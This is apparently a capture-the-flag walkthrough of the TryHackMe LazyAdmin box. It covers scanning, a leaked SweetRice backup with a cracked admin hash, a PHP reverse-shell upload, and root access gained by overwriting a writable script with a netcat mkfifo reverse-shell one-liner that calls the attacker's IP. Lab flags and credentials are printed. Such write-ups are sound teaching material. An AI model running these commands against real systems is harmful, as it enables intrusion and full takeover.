---
layout: post
title: TryHackMe - LazyAdmin
---
Connect with OpenVPN for access to server at 10.10.108.85.
## Enumeration
Let's scan with nmap, but save it to a metasploit db.
```
msfdb reinit
msf5 > db_nmap -sV 10.10.108.85
```
Port 22 (SSH) and Port 80 (HTTP) are open.

No credentials, so let's check out the website being hosted. It's a default splash screen for Apache2.

Let's run dirb to check directory structure of the site.
```
$ dirb http://10.10.108.85 -R
---- Scanning URL: http://10.10.108.85/ ----
==> DIRECTORY: http://10.10.108.85/content/                                                       
+ http://10.10.108.85/index.html (CODE:200|SIZE:11321)                                            
+ http://10.10.108.85/server-status (CODE:403|SIZE:277)                                           
                                                                                                  
---- Entering directory: http://10.10.108.85/content/ ----
==> DIRECTORY: http://10.10.108.85/content/_themes/                                               
==> DIRECTORY: http://10.10.108.85/content/as/                                                    
==> DIRECTORY: http://10.10.108.85/content/attachment/                                            
==> DIRECTORY: http://10.10.108.85/content/images/                                                
==> DIRECTORY: http://10.10.108.85/content/inc/  
```
Navigate to http://10.10.108.85/index.html, and see that the webserver uses Basic CMS SweetRice.

```
$ searchsploit sweetrice
---------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                      |  Path
                                                                                                    | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------------- ----------------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                             | exploits/php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                          | exploits/php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                           | exploits/php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                             | exploits/php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                 | exploits/php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                        | exploits/php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                   | exploits/php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                               | exploits/php/webapps/14184.txt
---------------------------------------------------------------------------------------------------- ----------------------------------------
```
## Exploitation
Reading through some of these text files, we come across 40718 (located at /usr/share/exploitdb/exploits/php/webapps/40718.txt). The file explains that MySQL backups are unprotected and are stored at /inc/mysql_backup.

There is nothing at http://10.10.108.85/inc/mysql_backup. We check back to our output of dirb and see http://10.10.108.85/content/inc. We navigate to http://10.10.108.85/content/inc/mysql_backup. Here lies a single sql file.

It is all condensed, but readable. We are particularly interested in this part:
```
s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";

```
Credentials! Let's crack the password which looks like an MD5 hash.
```
$ hashcat hash /usr/share/wordlists/rockyou.txt -m 0 --force
42f749ade7f9e195bf475f37a44cafcb:Password123     
```
Login to admin console at http://10.10.108.85/content/as with manager:Password123.

Upload php-reverse-shell to ads section of admin panel by directly pasting the script into the field. We name the ad reverse-shell.

Listen in on selected port 1234 on attacker machine.
```$ nc -lvnp 1234```

Navigate to http://10.10.108.85/content/inc/ads/reverse-shell.php where our ad is stored.

Attacker now has an unprivileged shell into remote.
``` bash
$ whoami
www-data
$ cd /home
$ cd itguy
$ ls
$ cat user.txt	
THM{63e5bce9271952aad1113b6f1ac28a07}
$ cat mysql_login.txt
rice:randompass
```
## Privilege Escalation
Let's check what are we able to do as www-data.
```bash
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

$ ls -al /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29 13:45 /etc/copy.sh
//we have permission

$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

//no text editors to edit, so we'll do some piping
$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.20.232 5554 >/tmp/f' > /etc/copy.sh
```
In another terminal window:
```
$ nc -lvnp 5554
listening on [any] 5554 ...
```
Run from remote:
```
$ sudo /usr/bin/perl /home/itguy/backup.pl
```
Back at other terminal window:
```
connect to [10.8.20.232] from (UNKNOWN) [10.10.44.194] 60918
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```